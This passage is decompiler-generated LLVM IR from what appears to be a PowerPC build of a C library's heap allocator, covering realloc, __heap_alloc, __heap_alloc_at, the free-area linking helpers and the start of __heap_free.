  %v0_1000ff78 = call i32 @__pthread_return_0()
  %v0_1000ff7c = load i32, i32* @r27, align 4
  %v1_1000ff7c = load i32, i32* @r29, align 4
  %v0_1000ff84 = load i32, i32* @r31, align 4
  %v2_1000ff7c = sub i32 12, %v0_1000ff7c
  %v1_1000ff80 = add i32 %v2_1000ff7c, %v1_1000ff7c
  %v2_1000ff84 = sub i32 %v1_1000ff80, %v0_1000ff84
  store i32 268500876, i32* @lr, align 4
  %v1_1000ff88 = call i32 @__GI_sbrk(i32 %v2_1000ff84)
  br label %dec_label_pc_1000ff94

dec_label_pc_1000ff94:                            ; preds = %dec_label_pc_1000ff38, %dec_label_pc_1000ff70
  %v0_1000ff94 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000ff98

dec_label_pc_1000ff98:                            ; preds = %entry, %dec_label_pc_1000ff94
  %.0 = phi i32 [ undef, %entry ], [ %v0_1000ff94, %dec_label_pc_1000ff94 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000ff54, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ff98, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff94, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff70, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff54, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff38, { 1, 0 }
}

define i32 @realloc(i32 %arg1) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000ffac = load i32, i32* @r4, align 4
  %v3_1000ffac = icmp eq i32 %v0_1000ffac, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_1000ffac, label %dec_label_pc_1000ffc8, label %dec_label_pc_1000ffd4

dec_label_pc_1000ffc8:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_1000ffcc.664 to i32), i32* @lr, align 4
  %v0_1000ffc8 = call i32 @free()
  br label %dec_label_pc_1000ffe0

dec_label_pc_1000ffd4:                            ; preds = %entry
  %v3_1000ffd4 = icmp eq i32 %arg1, 0
  br i1 %v3_1000ffd4, label %dec_label_pc_1000ffe0, label %dec_label_pc_1000ffec

dec_label_pc_1000ffe0:                            ; preds = %dec_label_pc_1000ffd4, %dec_label_pc_1000ffc8
  %storemerge = phi i32 [ 0, %dec_label_pc_1000ffc8 ], [ %v0_1000ffac, %dec_label_pc_1000ffd4 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268500964, i32* @lr, align 4
  %v0_1000ffe0 = call i32 @malloc()
  store i32 %v0_1000ffe0, i32* @r28, align 4
  br label %dec_label_pc_100100c4

dec_label_pc_1000ffec:                            ; preds = %dec_label_pc_1000ffd4
  %v1_1000ffec = add i32 %v0_1000ffac, 7
  %v1_1000fff0 = add i32 %arg1, -4
  store i32 %v1_1000fff0, i32* %r27.global-to-local, align 4
  %v1_1000fff4 = call i32 @__asm_rlwinm(i32 %v1_1000ffec, i32 0, i32 0, i32 29)
  store i32 %v1_1000fff4, i32* %r31.global-to-local, align 4
  %v2_1000fff8 = inttoptr i32 %v1_1000fff0 to i32*
  %v3_1000fff8 = load i32, i32* %v2_1000fff8, align 4
  store i32 %v3_1000fff8, i32* @r30, align 4
  %v2_1000fffc = icmp ugt i32 %v1_1000fff4, 11
  br i1 %v2_1000fffc, label %dec_label_pc_10010008, label %dec_label_pc_10010004

dec_label_pc_10010004:                            ; preds = %dec_label_pc_1000ffec
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010008

dec_label_pc_10010008:                            ; preds = %dec_label_pc_1000ffec, %dec_label_pc_10010004
  %v0_10010088 = phi i32 [ %v1_1000fff4, %dec_label_pc_1000ffec ], [ 12, %dec_label_pc_10010004 ]
  %v3_10010008 = icmp ugt i32 %v0_10010088, %v3_1000fff8
  br i1 %v3_10010008, label %dec_label_pc_10010010, label %dec_label_pc_10010088

dec_label_pc_10010010:                            ; preds = %dec_label_pc_10010008
  store i32 ptrtoint (i32* @global_var_1002ea60.658 to i32), i32* @r29, align 4
  %v0_1001001c = call i32 @__pthread_return_0()
  %v0_10010024 = load i32, i32* %r27.global-to-local, align 4
  %v1_10010024 = load i32, i32* @r30, align 4
  %v2_10010024 = add i32 %v1_10010024, %v0_10010024
  %v1_10010028 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010028 = sub i32 %v1_10010028, %v1_10010024
  %v4_10010030 = call i32 @__heap_alloc_at(i32* nonnull @global_var_100287c0, i32 %v2_10010024, i32 %v2_10010028)
  store i32 %v4_10010030, i32* %r27.global-to-local, align 4
  %v0_1001003c = call i32 @__pthread_return_0()
  %v3_10010040 = icmp eq i32 %v4_10010030, 0
  br i1 %v3_10010040, label %dec_label_pc_10010054, label %dec_label_pc_10010048

dec_label_pc_10010048:                            ; preds = %dec_label_pc_10010010
  %v0_10010048 = load i32, i32* @r30, align 4
  %v2_10010048 = add i32 %v0_10010048, %v4_10010030
  %v1_1001004c = load i32, i32* @r28, align 4
  %v2_1001004c = add i32 %v1_1001004c, -4
  %v3_1001004c = inttoptr i32 %v2_1001004c to i32*
  store i32 %v2_10010048, i32* %v3_1001004c, align 4
  br label %dec_label_pc_100100c4

dec_label_pc_10010054:                            ; preds = %dec_label_pc_10010010
  %v0_10010054 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010054 = add i32 %v0_10010054, -4
  store i32 %v1_10010054, i32* @r3, align 4
  store i32 268501084, i32* @lr, align 4
  %v0_10010058 = call i32 @malloc()
  store i32 %v0_10010058, i32* @r3, align 4
  store i32 %v0_10010058, i32* @r31, align 4
  %v3_1001005c = icmp eq i32 %v0_10010058, 0
  br i1 %v3_1001005c, label %dec_label_pc_10010064, label %dec_label_pc_1001006c

dec_label_pc_10010064:                            ; preds = %dec_label_pc_10010054
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100100c4

dec_label_pc_1001006c:                            ; preds = %dec_label_pc_10010054
  %v0_1001006c = load i32, i32* @r28, align 4
  store i32 %v0_1001006c, i32* @r4, align 4
  %v0_10010070 = load i32, i32* @r30, align 4
  %v1_10010070 = add i32 %v0_10010070, -4
  store i32 %v1_10010070, i32* @r5, align 4
  store i32 268501112, i32* @lr, align 4
  %v0_10010074 = call i32 @memcpy()
  %v0_10010078 = load i32, i32* @r28, align 4
  store i32 %v0_10010078, i32* @r3, align 4
  store i32 268501120, i32* @lr, align 4
  %v0_1001007c = call i32 @free()
  %v0_10010080 = load i32, i32* @r31, align 4
  store i32 %v0_10010080, i32* @r28, align 4
  br label %dec_label_pc_100100c4

dec_label_pc_10010088:                            ; preds = %dec_label_pc_10010008
  %v1_10010088 = add i32 %v0_10010088, 28
  %v3_1001008c = icmp ugt i32 %v1_10010088, %v3_1000fff8
  br i1 %v3_1001008c, label %dec_label_pc_100100c4, label %dec_label_pc_10010094

dec_label_pc_10010094:                            ; preds = %dec_label_pc_10010088
  store i32 ptrtoint (i32* @global_var_1002ea60.658 to i32), i32* @r29, align 4
  %v0_100100a0 = call i32 @__pthread_return_0()
  %v0_100100a8 = load i32, i32* %r27.global-to-local, align 4
  %v1_100100a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100100a8 = add i32 %v1_100100a8, %v0_100100a8
  %v1_100100ac = load i32, i32* @r30, align 4
  %v2_100100ac = sub i32 %v1_100100ac, %v1_100100a8
  store i32 268501176, i32* @lr, align 4
  %v4_100100b4 = call i32 @__heap_free(i32* nonnull @global_var_100287c0, i32 %v2_100100a8, i32 %v2_100100ac)
  %v0_100100bc = call i32 @__pthread_return_0()
  %v0_100100c0 = load i32, i32* @r31, align 4
  %v1_100100c0 = load i32, i32* @r28, align 4
  %v2_100100c0 = add i32 %v1_100100c0, -4
  %v3_100100c0 = inttoptr i32 %v2_100100c0 to i32*
  store i32 %v0_100100c0, i32* %v3_100100c0, align 4
  br label %dec_label_pc_100100c4

dec_label_pc_100100c4:                            ; preds = %dec_label_pc_10010088, %dec_label_pc_1001006c, %dec_label_pc_10010064, %dec_label_pc_10010048, %dec_label_pc_1000ffe0, %dec_label_pc_10010094
  %v0_100100c8 = load i32, i32* @r28, align 4
  ret i32 %v0_100100c8

; uselistorder directives
  uselistorder i32 %v1_100100a8, { 1, 0 }
  uselistorder i32 %v4_10010030, { 1, 0, 2 }
  uselistorder i32 %v1_10010024, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_100287c0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100100c4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10010008, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_100100dc = inttoptr i32 %arg2 to i32*
  %v2_100100dc = load i32, i32* %v1_100100dc, align 4
  %v1_100100e0 = add i32 %v2_100100dc, 3
  store i32 %v1_100100e0, i32* %r9.global-to-local, align 4
  %v1_100100e4 = call i32 @__asm_rlwinm(i32 %v1_100100e0, i32 0, i32 0, i32 29)
  %v2_100100e8 = icmp ugt i32 %v1_100100e4, 11
  br i1 %v2_100100e8, label %dec_label_pc_1001016c.preheader, label %dec_label_pc_100100f0

dec_label_pc_100100f0:                            ; preds = %entry
  br label %dec_label_pc_1001016c.preheader

dec_label_pc_1001016c.preheader:                  ; preds = %entry, %dec_label_pc_100100f0
  %storemerge20 = phi i32 [ 12, %dec_label_pc_100100f0 ], [ %v1_100100e4, %entry ]
  %v0_10010150 = phi i32 [ 12, %dec_label_pc_100100f0 ], [ %v1_100100e4, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1001016c5 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1001016c5, label %dec_label_pc_10010174, label %dec_label_pc_100100fc

dec_label_pc_100100fc:                            ; preds = %dec_label_pc_1001016c.preheader, %dec_label_pc_10010168
  %v0_10010168 = phi i32 [ %storemerge, %dec_label_pc_10010168 ], [ %storemerge2, %dec_label_pc_1001016c.preheader ]
  %v1_100100fc = inttoptr i32 %v0_10010168 to i32*
  %v2_100100fc = load i32, i32* %v1_100100fc, align 4
  store i32 %v2_100100fc, i32* %r10.global-to-local, align 4
  %v2_10010100 = icmp ult i32 %v2_100100fc, %v0_10010150
  br i1 %v2_10010100, label %dec_label_pc_10010168, label %dec_label_pc_10010108

dec_label_pc_10010108:                            ; preds = %dec_label_pc_100100fc
  %v1_10010108 = add i32 %v0_10010150, 44
  %v2_1001010c = icmp ult i32 %v2_100100fc, %v1_10010108
  br i1 %v2_1001010c, label %dec_label_pc_10010114, label %dec_label_pc_10010150

dec_label_pc_10010114:                            ; preds = %dec_label_pc_10010108
  %v1_10010114 = add i32 %v0_10010168, 4
  %v2_10010114 = inttoptr i32 %v1_10010114 to i32*
  %v3_10010114 = load i32, i32* %v2_10010114, align 4
  store i32 %v3_10010114, i32* %r11.global-to-local, align 4
  %v3_10010118 = icmp eq i32 %v3_10010114, 0
  br i1 %v3_10010118, label %dec_label_pc_10010128, label %dec_label_pc_10010120

dec_label_pc_10010120:                            ; preds = %dec_label_pc_10010114
  %v1_10010120 = add i32 %v0_10010168, 8
  %v2_10010120 = inttoptr i32 %v1_10010120 to i32*
  %v3_10010120 = load i32, i32* %v2_10010120, align 4
  %v2_10010124 = add i32 %v3_10010114, 8
  %v3_10010124 = inttoptr i32 %v2_10010124 to i32*
  store i32 %v3_10010120, i32* %v3_10010124, align 4
  %v0_10010128.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10010144.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010128

dec_label_pc_10010128:                            ; preds = %dec_label_pc_10010114, %dec_label_pc_10010120
  %v0_10010144 = phi i32 [ %v2_100100fc, %dec_label_pc_10010114 ], [ %v0_10010144.pre, %dec_label_pc_10010120 ]
  %v0_10010128 = phi i32 [ %v0_10010168, %dec_label_pc_10010114 ], [ %v0_10010128.pre, %dec_label_pc_10010120 ]
  %v1_10010128 = add i32 %v0_10010128, 8
  %v2_10010128 = inttoptr i32 %v1_10010128 to i32*
  %v3_10010128 = load i32, i32* %v2_10010128, align 4
  store i32 %v3_10010128, i32* @r8, align 4
  %v1_1001012c = add i32 %v0_10010128, 4
  %v2_1001012c = inttoptr i32 %v1_1001012c to i32*
  %v3_1001012c = load i32, i32* %v2_1001012c, align 4
  %v3_10010130 = icmp eq i32 %v3_10010128, 0
  store i32 %v0_10010144, i32* %r11.global-to-local, align 4
  br i1 %v3_10010130, label %dec_label_pc_10010144, label %dec_label_pc_10010138

dec_label_pc_10010138:                            ; preds = %dec_label_pc_10010128
  %v2_1001013c = add i32 %v3_10010128, 4
  %v3_1001013c = inttoptr i32 %v2_1001013c to i32*
  store i32 %v3_1001012c, i32* %v3_1001013c, align 4
  br label %dec_label_pc_10010158

dec_label_pc_10010144:                            ; preds = %dec_label_pc_10010128
  store i32 %v3_1001012c, i32* %arg1, align 4
  br label %dec_label_pc_10010158

dec_label_pc_10010150:                            ; preds = %dec_label_pc_10010108
  %v2_10010150 = sub i32 %v2_100100fc, %v0_10010150
  store i32 %v2_10010150, i32* %v1_100100fc, align 4
  br label %dec_label_pc_10010158

dec_label_pc_10010158:                            ; preds = %dec_label_pc_10010144, %dec_label_pc_10010138, %dec_label_pc_10010150
  %v0_10010158 = load i32, i32* %r10.global-to-local, align 4
  %v1_10010158 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010158 = sub i32 %v1_10010158, %v0_10010158
  store i32 %v2_10010158, i32* %r9.global-to-local, align 4
  %v0_1001015c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1001015c, i32* %v1_100100dc, align 4
  %v0_10010160 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010160 = add i32 %v0_10010160, 12
  ret i32 %v1_10010160

dec_label_pc_10010168:                            ; preds = %dec_label_pc_100100fc
  %v1_10010168 = add i32 %v0_10010168, 4
  %storemerge.in = inttoptr i32 %v1_10010168 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1001016c = icmp eq i32 %storemerge, 0
  br i1 %v3_1001016c, label %dec_label_pc_1001016c.dec_label_pc_10010174_crit_edge, label %dec_label_pc_100100fc

dec_label_pc_1001016c.dec_label_pc_10010174_crit_edge: ; preds = %dec_label_pc_10010168
  br label %dec_label_pc_10010174

dec_label_pc_10010174:                            ; preds = %dec_label_pc_1001016c.dec_label_pc_10010174_crit_edge, %dec_label_pc_1001016c.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10010128, { 1, 0 }
  uselistorder i32 %v2_100100fc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10010168, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_10010150, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10010158, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010128, { 1, 0 }
  uselistorder label %dec_label_pc_100100fc, { 1, 0 }
  uselistorder label %dec_label_pc_1001016c.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1001017c = load i32, i32* %arg1, align 4
  store i32 %v2_1001017c, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_10010184 = add i32 %arg3, 3
  %v3_100102083 = icmp eq i32 %v2_1001017c, 0
  br i1 %v3_100102083, label %dec_label_pc_10010210, label %dec_label_pc_1001018c

dec_label_pc_1001018c:                            ; preds = %entry, %dec_label_pc_10010204
  %v0_10010204 = phi i32 [ %v3_10010204, %dec_label_pc_10010204 ], [ %v2_1001017c, %entry ]
  %v1_1001018c = inttoptr i32 %v0_10010204 to i32*
  %v2_1001018c = load i32, i32* %v1_1001018c, align 4
  %v2_10010190 = sub i32 %v0_10010204, %v2_1001018c
  %v1_10010194 = add i32 %v2_10010190, 12
  %v3_10010198 = icmp ugt i32 %v1_10010194, %arg2
  br i1 %v3_10010198, label %dec_label_pc_10010204, label %dec_label_pc_100101a0

dec_label_pc_100101a0:                            ; preds = %dec_label_pc_1001018c
  %v4_10010198 = icmp eq i32 %v1_10010194, %arg2
  br i1 %v4_10010198, label %dec_label_pc_100101a8, label %dec_label_pc_10010210

dec_label_pc_100101a8:                            ; preds = %dec_label_pc_100101a0
  %v1_100101a8 = call i32 @__asm_rlwinm(i32 %v1_10010184, i32 0, i32 0, i32 29)
  %v2_100101ac = icmp ult i32 %v2_1001018c, %v1_100101a8
  br i1 %v2_100101ac, label %dec_label_pc_10010210, label %dec_label_pc_100101b4

dec_label_pc_100101b4:                            ; preds = %dec_label_pc_100101a8
  %v1_100101b4 = add i32 %v1_100101a8, 44
  %v2_100101b8 = icmp ult i32 %v2_1001018c, %v1_100101b4
  br i1 %v2_100101b8, label %dec_label_pc_100101c0, label %dec_label_pc_100101f4

dec_label_pc_100101c0:                            ; preds = %dec_label_pc_100101b4
  %v0_100101c0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100101c0 = add i32 %v0_100101c0, 4
  %v2_100101c0 = inttoptr i32 %v1_100101c0 to i32*
  %v3_100101c0 = load i32, i32* %v2_100101c0, align 4
  %v3_100101c4 = icmp eq i32 %v3_100101c0, 0
  br i1 %v3_100101c4, label %dec_label_pc_100101d4, label %dec_label_pc_100101cc

dec_label_pc_100101cc:                            ; preds = %dec_label_pc_100101c0
  %v1_100101cc = add i32 %v0_100101c0, 8
  %v2_100101cc = inttoptr i32 %v1_100101cc to i32*
  %v3_100101cc = load i32, i32* %v2_100101cc, align 4
  %v2_100101d0 = add i32 %v3_100101c0, 8
  %v3_100101d0 = inttoptr i32 %v2_100101d0 to i32*
  store i32 %v3_100101cc, i32* %v3_100101d0, align 4
  %v0_100101d4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100101d4

dec_label_pc_100101d4:                            ; preds = %dec_label_pc_100101c0, %dec_label_pc_100101cc
  %v0_100101d4 = phi i32 [ %v0_100101c0, %dec_label_pc_100101c0 ], [ %v0_100101d4.pre, %dec_label_pc_100101cc ]
  %v1_100101d4 = add i32 %v0_100101d4, 8
  %v2_100101d4 = inttoptr i32 %v1_100101d4 to i32*
  %v3_100101d4 = load i32, i32* %v2_100101d4, align 4
  %v1_100101d8 = add i32 %v0_100101d4, 4
  %v2_100101d8 = inttoptr i32 %v1_100101d8 to i32*
  %v3_100101d8 = load i32, i32* %v2_100101d8, align 4
  %v3_100101dc = icmp eq i32 %v3_100101d4, 0
  br i1 %v3_100101dc, label %dec_label_pc_100101ec, label %dec_label_pc_100101e4

dec_label_pc_100101e4:                            ; preds = %dec_label_pc_100101d4
  %v2_100101e4 = add i32 %v3_100101d4, 4
  %v3_100101e4 = inttoptr i32 %v2_100101e4 to i32*
  store i32 %v3_100101d8, i32* %v3_100101e4, align 4
  ret i32 %v2_1001018c

dec_label_pc_100101ec:                            ; preds = %dec_label_pc_100101d4
  %v1_100101ec = load i32, i32* @r8, align 4
  %v2_100101ec = inttoptr i32 %v1_100101ec to i32*
  store i32 %v3_100101d8, i32* %v2_100101ec, align 4
  ret i32 %v2_1001018c

dec_label_pc_100101f4:                            ; preds = %dec_label_pc_100101b4
  %v2_100101f4 = sub i32 %v2_1001018c, %v1_100101a8
  %v1_100101fc = load i32, i32* %r11.global-to-local, align 4
  %v2_100101fc = inttoptr i32 %v1_100101fc to i32*
  store i32 %v2_100101f4, i32* %v2_100101fc, align 4
  ret i32 %v1_100101a8

dec_label_pc_10010204:                            ; preds = %dec_label_pc_1001018c
  %v1_10010204 = add i32 %v0_10010204, 4
  %v2_10010204 = inttoptr i32 %v1_10010204 to i32*
  %v3_10010204 = load i32, i32* %v2_10010204, align 4
  store i32 %v3_10010204, i32* %r11.global-to-local, align 4
  %v3_10010208 = icmp eq i32 %v3_10010204, 0
  br i1 %v3_10010208, label %dec_label_pc_10010208.dec_label_pc_10010210.loopexit_crit_edge, label %dec_label_pc_1001018c

dec_label_pc_10010208.dec_label_pc_10010210.loopexit_crit_edge: ; preds = %dec_label_pc_10010204
  br label %dec_label_pc_10010210

dec_label_pc_10010210:                            ; preds = %entry, %dec_label_pc_10010208.dec_label_pc_10010210.loopexit_crit_edge, %dec_label_pc_100101a0, %dec_label_pc_100101a8
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10010204, { 1, 2, 0 }
  uselistorder i32 %v0_100101d4, { 1, 0 }
  uselistorder i32 %v1_100101a8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1001018c, { 4, 3, 1, 0, 2, 5 }
  uselistorder i32 %v0_10010204, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10010210, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_100101d4, { 1, 0 }
  uselistorder label %dec_label_pc_1001018c, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10010218 = icmp eq i32 %arg3, 0
  %v2_1001021c = add i32 %arg2, 4
  %v3_1001021c = inttoptr i32 %v2_1001021c to i32*
  store i32 %arg4, i32* %v3_1001021c, align 4
  %v2_10010220 = add i32 %arg2, 8
  %v3_10010220 = inttoptr i32 %v2_10010220 to i32*
  store i32 %arg3, i32* %v3_10010220, align 4
  br i1 %v3_10010218, label %dec_label_pc_10010230, label %dec_label_pc_10010228

dec_label_pc_10010228:                            ; preds = %entry
  %v2_10010228 = add i32 %arg3, 4
  %v3_10010228 = inttoptr i32 %v2_10010228 to i32*
  store i32 %arg2, i32* %v3_10010228, align 4
  br label %dec_label_pc_10010234

dec_label_pc_10010230:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10010234

dec_label_pc_10010234:                            ; preds = %dec_label_pc_10010228, %dec_label_pc_10010230
  %v3_10010234 = icmp eq i32 %arg4, 0
  %v0_10010238 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10010234, i32 %v0_10010238)
  %v2_1001023c = add i32 %arg4, 8
  %v3_1001023c = inttoptr i32 %v2_1001023c to i32*
  store i32 %arg2, i32* %v3_1001023c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_10010234, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10010244 = icmp eq i32 %arg3, 0
  br i1 %v3_10010244, label %dec_label_pc_10010254, label %dec_label_pc_1001024c

dec_label_pc_1001024c:                            ; preds = %entry
  %v2_1001024c = add i32 %arg3, 4
  %v3_1001024c = inttoptr i32 %v2_1001024c to i32*
  store i32 %arg2, i32* %v3_1001024c, align 4
  br label %dec_label_pc_10010258

dec_label_pc_10010254:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10010258

dec_label_pc_10010258:                            ; preds = %dec_label_pc_1001024c, %dec_label_pc_10010254
  %v2_10010258 = add i32 %arg2, 8
  %v3_10010258 = inttoptr i32 %v2_10010258 to i32*
  store i32 %arg3, i32* %v3_10010258, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010258, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_10010278 = load i32, i32* %arg1, align 4
  store i32 %v2_10010278, i32* @r31, align 4
  %v2_1001027c = add i32 %arg3, %arg2
  store i32 %v2_1001027c, i32* %r3.global-to-local, align 4
  %v3_100102907 = icmp eq i32 %v2_10010278, 0
  %v1_100102948 = add i32 %v2_10010278, 12
  %tmp69 = icmp uge i32 %v1_100102948, %arg2
  %or.cond10 = or i1 %v3_100102907, %tmp69
  br i1 %or.cond10, label %dec_label_pc_100102a0, label %dec_label_pc_10010288

dec_label_pc_10010288:                            ; preds = %entry, %dec_label_pc_10010288
  %v0_100102e811 = phi i32 [ %v3_1001028c, %dec_label_pc_10010288 ], [ %v2_10010278, %entry ]
  store i32 %v0_100102e811, i32* %r11.global-to-local, align 4
  %v1_1001028c = add i32 %v0_100102e811, 4
  %v2_1001028c = inttoptr i32 %v1_1001028c to i32*
  %v3_1001028c = load i32, i32* %v2_1001028c, align 4
  store i32 %v3_1001028c, i32* @r31, align 4
  %v3_10010290 = icmp eq i32 %v3_1001028c, 0
  %v1_10010294 = add i32 %v3_1001028c, 12
  %tmp6 = icmp uge i32 %v1_10010294, %arg2
  %or.cond = or i1 %v3_10010290, %tmp6
  br i1 %or.cond, label %dec_label_pc_100102a0, label %dec_label_pc_10010288

dec_label_pc_100102a0:                            ; preds = %dec_label_pc_10010288, %entry
  %v0_100102dc.lcssa = phi i32 [ 0, %entry ], [ %v0_100102e811, %dec_label_pc_10010288 ]
  %v0_100102e8.lcssa = phi i32 [ %v2_10010278, %entry ], [ %v3_1001028c, %dec_label_pc_10010288 ]
  %v3_10010290.lcssa = phi i1 [ %v3_100102907, %entry ], [ %v3_10010290, %dec_label_pc_10010288 ]
  br i1 %v3_10010290.lcssa, label %dec_label_pc_10010358, label %dec_label_pc_100102a8

dec_label_pc_100102a8:                            ; preds = %dec_label_pc_100102a0
  %v1_100102a8 = inttoptr i32 %v0_100102e8.lcssa to i32*
  %v2_100102a8 = load i32, i32* %v1_100102a8, align 4
  %v2_100102ac = sub i32 %v0_100102e8.lcssa, %v2_100102a8
  %v1_100102b0 = add i32 %v2_100102ac, 12
  %v3_100102b4 = icmp ugt i32 %v1_100102b0, %v2_1001027c
  br i1 %v3_100102b4, label %dec_label_pc_10010358, label %dec_label_pc_100102bc

dec_label_pc_100102bc:                            ; preds = %dec_label_pc_100102a8
  %v4_100102b4 = icmp eq i32 %v1_100102b0, %v2_1001027c
  %v2_100102c0 = add i32 %v2_100102a8, %arg3
  store i32 %v2_100102c0, i32* @r29, align 4
  br i1 %v4_100102b4, label %dec_label_pc_100102c8, label %dec_label_pc_100102f8

dec_label_pc_100102c8:                            ; preds = %dec_label_pc_100102bc
  %v3_100102c8 = icmp eq i32 %v0_100102dc.lcssa, 0
  br i1 %v3_100102c8, label %dec_label_pc_1001034c, label %dec_label_pc_100102d0

dec_label_pc_100102d0:                            ; preds = %dec_label_pc_100102c8
  %v1_100102d0 = add i32 %v0_100102dc.lcssa, 12
  %v4_100102d4 = icmp eq i32 %v1_100102d0, %arg2
  br i1 %v4_100102d4, label %dec_label_pc_100102dc, label %dec_label_pc_1001034c

dec_label_pc_100102dc:                            ; preds = %dec_label_pc_100102d0
  %v1_100102dc = inttoptr i32 %v0_100102dc.lcssa to i32*
  %v2_100102dc = load i32, i32* %v1_100102dc, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_100102e4 = add i32 %v0_100102dc.lcssa, 8
  %v2_100102e4 = inttoptr i32 %v1_100102e4 to i32*
  %v3_100102e4 = load i32, i32* %v2_100102e4, align 4
  %v2_100102ec = add i32 %v2_100102dc, %v2_100102c0
  store i32 %v2_100102ec, i32* @r29, align 4
  %v5_100102f0 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_100102e8.lcssa, i32 %v3_100102e4, i32 %v2_1001027c)
  store i32 %v5_100102f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001034c

dec_label_pc_100102f8:                            ; preds = %dec_label_pc_100102bc
  %v1_100102f8 = add i32 %v0_100102e8.lcssa, 4
  %v2_100102f8 = inttoptr i32 %v1_100102f8 to i32*
  %v3_100102f8 = load i32, i32* %v2_100102f8, align 4
  %v3_100102fc = icmp eq i32 %v3_100102f8, 0
  br i1 %v3_100102fc, label %dec_label_pc_10010334, label %dec_label_pc_10010304

dec_label_pc_10010304:                            ; preds = %dec_label_pc_100102f8
  %v1_10010304 = inttoptr i32 %v3_100102f8 to i32*
  %v2_10010304 = load i32, i32* %v1_10010304, align 4
  %v2_10010308 = sub i32 %v3_100102f8, %v2_10010304
